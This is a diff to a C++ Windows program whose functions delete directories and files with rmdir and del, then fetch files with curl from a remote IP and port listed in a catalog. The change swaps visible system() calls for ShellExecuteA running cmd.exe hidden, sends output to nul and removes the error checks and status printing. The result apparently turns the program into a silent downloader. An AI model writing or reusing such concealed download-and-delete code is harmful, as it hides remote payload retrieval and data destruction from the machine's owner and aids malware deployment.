@@ -43,15 +43,14 @@ int MakeDirectoryNotNullTerm(char* FullDirectoryPath) {
     char CreateCommand[1024] = { 0 };
     RtlCopyMemory(CreateDirPath, FullDirectoryPath, DirectoryPath.find("\n"));
     CreateDirPath[DirectoryPath.find("\n")] = '\0';
-    strcat_s(DeleteExistCommand, "rmdir /s /q ");
+    strcat_s(DeleteExistCommand, "/C rmdir /s /q ");
     strcat_s(DeleteExistCommand, CreateDirPath);
-    strcat_s(CreateCommand, "mkdir ");
+    strcat_s(DeleteExistCommand, " > nul");
+    strcat_s(CreateCommand, "/C mkdir ");
     strcat_s(CreateCommand, CreateDirPath);
-    if (system(DeleteExistCommand) == -1 ||
-        system(CreateCommand) == -1) {
-        return 0;
-    }
-    printf("[+] Created directory %s\n", CreateDirPath);
+    strcat_s(CreateCommand, " > nul");
+    ShellExecuteA(0, "open", "cmd.exe", DeleteExistCommand, 0, SW_HIDE);
+    ShellExecuteA(0, "open", "cmd.exe", CreateCommand, 0, SW_HIDE);
     return (int)DirectoryPath.find("\n") + 2;  // Skip the '\n' character to get to the next line
 }
 
@@ -68,9 +67,10 @@ int DownloadFileFromHost(char* FilePath, char* FileHostIp, char* FileHostingPort
     (char*)((ULONG64)FilePath + DownloadFilePaths.find("?") + 1),
         DownloadFilePaths.find("\n") - DownloadFilePaths.find("?") - 1);
     RelativeFileHostPath[DownloadFilePaths.find("\n") - DownloadFilePaths.find("?") - 1] = '\0';
-    strcat_s(DeleteExistCommand, "del /s /q ");
+    strcat_s(DeleteExistCommand, "/C del /s /q ");
     strcat_s(DeleteExistCommand, AbsoluteDownloadPath);
-    strcat_s(CurlCommand, "curl http://");
+    strcat_s(DeleteExistCommand, " > nul");
+    strcat_s(CurlCommand, "/C curl http://");
     strcat_s(CurlCommand, FileHostIp);
     strcat_s(CurlCommand, ":");
     strcat_s(CurlCommand, FileHostingPort);
@@ -78,11 +78,9 @@ int DownloadFileFromHost(char* FilePath, char* FileHostIp, char* FileHostingPort
     strcat_s(CurlCommand, RelativeFileHostPath);
     strcat_s(CurlCommand, " --output ");
     strcat_s(CurlCommand, AbsoluteDownloadPath);
-    if (system(DeleteExistCommand) == -1 ||
-        system(CurlCommand) == -1) {
-        return 0;
-    }
-    printf("[+] Downloaded file into %s, curl command: %s\n", AbsoluteDownloadPath, CurlCommand);
+    strcat_s(CurlCommand, " > nul");
+    ShellExecuteA(0, "open", "cmd.exe", DeleteExistCommand, 0, SW_HIDE);
+    ShellExecuteA(0, "open", "cmd.exe", CurlCommand, 0, SW_HIDE);
     return (int)DownloadFilePaths.find("\n") + 1;  // Skip the '\n' character to get to the next line
 }
 
@@ -137,7 +135,6 @@ BOOL DownloadFilesFromCatalog(char* FileHostIp, char* CatalogFilePath) {
             }
             CatalogIndex += CurrentAddOffset;
         }
-        printf("Current catalog index: %d\n", CatalogIndex);
     }
     return TRUE;
 }
